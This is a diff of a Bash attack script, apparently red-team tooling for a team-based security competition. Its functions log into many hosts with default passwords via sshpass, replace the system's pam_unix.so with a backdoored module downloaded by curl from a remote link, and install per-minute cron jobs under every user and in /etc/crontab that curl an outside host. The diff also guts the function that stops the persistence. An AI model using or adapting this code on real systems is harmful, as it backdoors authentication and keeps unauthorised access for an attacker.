@@ -16,9 +16,9 @@ send_backdoor() {
     for IP in "${IPs[@]}"; do
         for admin in "${admins[@]}"; do
             sshpass -p "$default_password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout_duration "$admin@$IP" "
-                echo \"$default_password\" | sudo -S cp "$path_to_pam/pam_unix.so" "$path_to_pam/.pam_unix.so.bak"
-                echo \"$default_password\" | sudo -S apt install curl -y
-                echo \"$default_password\" | sudo -S curl -o "$path_to_pam/pam_unix.so" "$backdoor_link"
+                echo "$default_password" | sudo -S cp "$path_to_pam/pam_unix.so" "$path_to_pam/.pam_unix.so.bak"
+                echo "$default_password" | sudo -S apt install curl -y
+                echo "$default_password" | sudo -S curl -o "$path_to_pam/pam_unix.so" "$backdoor_link"
             "
 
             if [[ $? -eq 0 ]]; then
@@ -40,12 +40,15 @@ send_persistence() {
 
         if [[ "$team_number_from_IP" == "$team_number" ]]; then
             sshpass -p "$backdoor_password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout_duration "root@$IP" "
-                echo \"$backdoor_password\" | sudo -S bash -c '
-                    users=\$(cut -d: -f1 /etc/passwd)
+                echo "$backdoor_password" | sudo -S bash -c '
+                    users=$(cut -d: -f1 /etc/passwd)
 
-                    for user in \$users; do
-                        echo \"\$backdoor_password\" | sudo -S bash -c \"(crontab -u \$user -l; echo \"* * * * * curl $scoring_link\") | crontab -u \$user -\"
+                    for user in $users; do
+                        bash -c "(crontab -u $user -l; echo "* * * * * curl $scoring_link") | crontab -u $user -"
                     done
+    
+                    echo "* * * * * root curl $scoring_link" | tee -a /etc/crontab
+                    echo "* * * * * root curl $scoring_link" | tee /etc/cron.d/persistence_minute
                 '
             "
 
@@ -60,28 +63,7 @@ send_persistence() {
 }
 
 stop_sending_persistence() {
-    read -p "Team to Stop Sending Persistence to: " team_number
-    read -p "Backdoor Password: " backdoor_password
-    count=0
 
-    while IFS= read -r IP; do
-        team_number_from_IP=$(echo "$IP" | cut -d'.' -f3)
-
-        if [[ "$team_number_from_IP" == "$team_number" ]]; then
-            for admin in "${admins[@]}"; do
-                sshpass -p "$backdoor_password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout_duration "$admin@$IP" "
-                    echo \"$backdoor_password\" | sudo -S echo "Hello"
-                "
-
-                if [[ $? -eq 0 ]]; then
-                    count=$((count + 1))
-                    break
-                fi
-            done
-        fi
-    done < backdoored_IPs.txt
-
-    echo "Number of successful stopped persistences: $count"
 }
 
 print_backdoored_IPs() {
